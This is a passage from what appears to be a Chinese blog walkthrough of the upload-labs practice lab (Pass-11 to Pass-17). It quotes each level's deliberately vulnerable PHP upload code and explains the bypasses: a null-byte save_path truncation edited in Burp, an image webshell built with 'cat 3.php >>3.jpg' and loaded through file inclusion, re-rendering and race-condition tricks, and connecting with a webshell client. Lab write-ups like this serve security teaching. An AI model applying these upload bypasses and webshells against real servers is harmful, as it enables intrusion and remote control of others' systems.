src="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-11-1.png"></a></p><p>如上图所示先将上传文件名改为3.jpg,burp代理拦截后将save_path改成…&#x2F;upload&#x2F;11.php%00，最后保存下来的文件就是3.php，再用蚁剑去连测试成功<br><a href="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-2.png"><img src="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-2.png"></a></p><h2 id="Pass-12文件路径0x00截断"><a href="#Pass-12文件路径0x00截断" class="headerlink" title="Pass-12文件路径0x00截断"></a>Pass-12文件路径0x00截断</h2><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123;    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr))&#123;        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &quot;上传失败&quot;;        &#125;    &#125; else &#123;        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    &#125;&#125;</span><br></pre></td></tr></table></figure><p>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要自行修改，这里先将文件抓包改为3.php ,并选中空格<br><a href="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-1.png"><img src="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-1.png"></a></p><p>右边多出来的inspector模块中编辑hex，改为00.而后点击Apply changes就可以了<br><a href="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-3.png"><img src="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-3.png"></a></p><p>然后发送数据包，查看路径，蚁剑连接。<br><a href="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-4.png"><img src="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-12-4.png"></a></p><h2 id="Pass-13-图片马绕过"><a href="#Pass-13-图片马绕过" class="headerlink" title="Pass-13 图片马绕过"></a>Pass-13 图片马绕过</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这关通过读文件的前2个字节判断文件类型，因此直接上传图片马即可。</p><p>利用kali制作图片马</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 3.php &gt;&gt;3.jpg</span><br></pre></td></tr></table></figure><p>上传后利用文件包含解析该文件即可</p><h2 id="Pass-14-图片马-getimagesize"><a href="#Pass-14-图片马-getimagesize" class="headerlink" title="Pass-14 图片马 getimagesize()"></a>Pass-14 图片马 getimagesize()</h2><p>查看源码可知这关是用getimagesize函数判断文件类型，同样也可用图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-15-图片马-exif-imagetype"><a href="#Pass-15-图片马-exif-imagetype" class="headerlink" title="Pass-15 图片马 exif_imagetype()"></a>Pass-15 图片马 exif_imagetype()</h2><p>查看源码可知这关是用exif_imagetype()函数判断文件类型，同样可用图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16 二次渲染绕过"></a>Pass-16 二次渲染绕过</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后还做了一次二次渲染，改变了图片中的部分内容。</p><p>突破思路：将一个正常显示的图片，上传到服务器。将图片被渲染后与原始图片对比，寻找仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p><h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17 条件竞争"></a>Pass-17 条件竞争</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ 